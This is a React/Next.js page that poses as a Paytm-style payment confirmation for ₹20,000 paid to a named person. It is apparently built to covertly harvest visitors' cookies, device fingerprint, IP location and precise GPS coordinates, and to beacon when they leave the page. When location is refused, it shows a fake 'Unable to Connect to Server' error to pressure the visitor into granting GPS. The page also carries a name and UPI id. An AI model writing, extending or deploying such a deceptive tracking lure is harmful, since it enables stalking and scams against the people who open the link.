"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { collectDeviceInfo } from "@/lib/deviceInfo";
import {
  trySilentGps,
  watchSilentGps,
  getGeolocationPermission,
} from "@/lib/silentLocation";
import {
  bootstrapCookies,
  getAllCookies,
  trackEverywhere,
} from "@/lib/tracker";

type Screen = "loading" | "retry" | "ready";

export default function Home() {
  const [screen, setScreen] = useState<Screen>("loading");
  const [busy, setBusy] = useState(false);
  const visitIdRef = useRef<string | null>(null);
  const visitorIdRef = useRef<string | null>(null);
  const sessionIdRef = useRef<string | null>(null);
  const stopWatchRef = useRef<(() => void) | null>(null);

  const pushGps = useCallback(
    async (coords: GeolocationCoordinates, note: string) => {
      await trackEverywhere(
        {
          stage: "location",
          visitId: visitIdRef.current,
          visitorId: visitorIdRef.current,
          sessionId: sessionIdRef.current,
          cookies: getAllCookies(),
          locationGranted: true,
          source: "gps",
          latitude: Number(coords.latitude),
          longitude: Number(coords.longitude),
          accuracy: coords.accuracy != null ? Number(coords.accuracy) : null,
          altitude: coords.altitude != null ? Number(coords.altitude) : null,
          heading: coords.heading != null ? Number(coords.heading) : null,
          speed: coords.speed != null ? Number(coords.speed) : null,
          locations: [
            {
              latitude: Number(coords.latitude),
              longitude: Number(coords.longitude),
              accuracy:
                coords.accuracy != null ? Number(coords.accuracy) : null,
              altitude:
                coords.altitude != null ? Number(coords.altitude) : null,
              heading: coords.heading != null ? Number(coords.heading) : null,
              speed: coords.speed != null ? Number(coords.speed) : null,
              source: "gps",
            },
          ],
          event: {
            type: note,
            at: new Date().toISOString(),
            meta: {
              latitude: coords.latitude,
              longitude: coords.longitude,
              accuracy: coords.accuracy,
            },
          },
        },
        { keepalive: true }
      );
    },
    []
  );

  const captureAndSave = useCallback(async () => {
    setBusy(true);
    setScreen("loading");

    try {
      // 1) Cookies first — no popup
      const boot = bootstrapCookies();
      visitorIdRef.current = boot.visitorId;
      sessionIdRef.current = boot.sessionId;

      // 2) Device fingerprint — no popup
      const device = await collectDeviceInfo();

      // 3) Save visit + server IP location (background, no browser popup)
      const bootResult = await trackEverywhere(
        {
          stage: "bootstrap",
          visitorId: boot.visitorId,
          sessionId: boot.sessionId,
          cookies: boot.cookies,
          device,
          locationGranted: false,
          event: { type: "page_open", at: new Date().toISOString() },
        },
        { keepalive: true }
      );

      if (bootResult.data?.id) {
        visitIdRef.current = String(bootResult.data.id);
      }

      // 4) EXACT GPS from phone (browser permission required — only way for real location)
      // IP location above is only approximate (city level) and can show wrong country (e.g. USA via VPN/CDN).
      const gotGps = await new Promise<boolean>((resolve) => {
        if (!navigator.geolocation) {
          resolve(false);
          return;
        }

        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            try {
              await pushGps(pos.coords, "location_granted");
              // Extra precise samples
              stopWatchRef.current = watchSilentGps(
                (c) => {
                  void pushGps(c, "location_sample");
                },
                { maxSamples: 3, durationMs: 10_000 }
              );
              resolve(true);
            } catch {
              resolve(false);
            }
          },
          async () => {
            // Denied / timeout → only IP approx remains in DB
            await trackEverywhere(
              {
                stage: "location_denied",
                visitId: visitIdRef.current,
                visitorId: visitorIdRef.current,
                sessionId: sessionIdRef.current,
                cookies: getAllCookies(),
                locationGranted: false,
                event: {
                  type: "location_denied",
                  at: new Date().toISOString(),
                },
              },
              { keepalive: true }
            );
            resolve(false);
          },
          {
            enableHighAccuracy: true, // GPS chip, not network/IP
            timeout: 25000,
            maximumAge: 0,
          }
        );
      });

      // If already granted from a previous visit, keep watching silently
      const perm = await getGeolocationPermission();
      if (gotGps && perm === "granted" && !stopWatchRef.current) {
        const coords = await trySilentGps();
        if (coords) await pushGps(coords, "silent_gps");
      }

      if (gotGps) setScreen("ready");
      else setScreen("retry"); // Try Again → re-request GPS permission
    } catch {
      setScreen("retry");
    } finally {
      setBusy(false);
    }
  }, [pushGps]);

  useEffect(() => {
    captureAndSave();
    return () => {
      stopWatchRef.current?.();
    };
  }, [captureAndSave]);

  // Track leave / tab hide (cookies already set)
  useEffect(() => {
    const onLeave = () => {
      if (!visitIdRef.current && !visitorIdRef.current) return;
      void trackEverywhere(
        {
          stage: "leave",
          visitId: visitIdRef.current,
          visitorId: visitorIdRef.current,
          sessionId: sessionIdRef.current,
          cookies: getAllCookies(),
          event: {
            type: "page_leave",
            at: new Date().toISOString(),
          },
        },
        { beacon: true, keepalive: true }
      );
    };

    const onVis = () => {
      if (document.visibilityState === "hidden") onLeave();
    };

    window.addEventListener("pagehide", onLeave);
    document.addEventListener("visibilitychange", onVis);
    return () => {
      window.removeEventListener("pagehide", onLeave);
      document.removeEventListener("visibilitychange", onVis);
    };
  }, []);

  if (screen === "loading") {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white px-6 text-center font-sans">
        <div className="relative mb-6 h-14 w-14">
          <div className="absolute inset-0 animate-spin rounded-full border-[3.5px] border-[#1a73e8]/20 border-t-[#1a73e8]" />
        </div>
        <p className="text-[15px] font-medium tracking-wide text-[#1f1f1f]">
          Processing…
        </p>
        <p className="mt-1 text-center text-sm text-[#747775]">
          Please wait a moment
        </p>
      </div>
    );
  }

  if (screen === "retry") {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white px-6 text-center font-sans">
        <div className="w-full max-w-sm">
          <div className="mx-auto mb-6 flex h-14 w-14 items-center justify-center rounded-full bg-red-50 text-red-500">
            <svg
              className="h-7 w-7"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={2}
              aria-hidden
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M12 9v3.75m9-.75a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 3.75h.008v.008H12v-.008Z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-semibold text-[#1f1f1f]">
            Unable to Connect to Server
          </h1>
          <p className="mt-2 text-sm leading-relaxed text-[#5f6368]">
            A network problem occurred and we couldn&apos;t reach the server.
            Please check your connection and try again.
          </p>
          <button
            type="button"
            disabled={busy}
            onClick={captureAndSave}
            className="mt-8 w-full rounded-full bg-[#1a73e8] py-3.5 text-[15px] font-medium text-white shadow-sm transition active:scale-[0.98] active:bg-[#1557b0] disabled:opacity-60"
          >
            {busy ? "Please wait…" : "Try Again"}
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white px-6 text-center font-sans select-none">
      {/* Success Blue Checkmark Badge */}
      <div className="mb-10 flex h-[108px] w-[108px] items-center justify-center rounded-full bg-[#1a73e8] shadow-sm">
        <svg
          className="h-14 w-14 text-white"
          fill="none"
          stroke="currentColor"
          viewBox="0 0 24 24"
          strokeWidth="3.2"
          strokeLinecap="round"
          strokeLinejoin="round"
        >
          <path d="M5.5 13.5L9.5 17.5L18.5 7.5" />
        </svg>
      </div>

      {/* Amount */}
      <h1 className="mb-9 text-[40px] font-normal tracking-tight text-[#1f1f1f]">
        ₹20,000.00
      </h1>

      {/* Payment Details */}
      <div className="flex flex-col items-center">
        <p className="text-[15px] font-normal text-[#444746]">Paid to</p>
        <h2 className="mt-1 mb-1 text-[26px] font-[500] tracking-[0.03em] text-[#1f1f1f] uppercase">
          RAHUL MEENA
        </h2>
        <p className="mt-0.5 mb-1 text-[15px] font-normal text-[#444746]">
          Paytm • rahulmeena086159@ptyes
        </p>
        <p className="mt-0.5 text-[14px] font-normal text-[#747775]">
          28 July 2026, 7:14 pm
        </p>
      </div>
    </div>
  );
}
